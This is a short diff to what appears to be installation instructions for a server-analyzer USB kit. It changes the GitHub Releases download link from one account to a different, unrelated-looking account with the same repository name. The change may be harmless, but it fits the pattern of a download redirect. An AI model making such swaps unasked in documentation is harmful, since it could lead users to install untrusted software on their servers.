@@ -15,7 +15,7 @@ away again. You control the timer, and the red button removes the trust at any m
 ## Part 1: Download from GitHub
 
 1. Open a web browser and go to the project's **Releases** page:
-   `https://github.com/obsidianintelligenceyyc/special-memory-analyzer/releases`
+   `https://github.com/Demonad112/special-memory-analyzer/releases`
 2. The top entry marked **Latest** is the newest version. Click its title.
 3. Scroll down to **Assets** and click these files to download them:
    - `Deep-Server-Analyzer-usb-kit.zip` (the one you need)
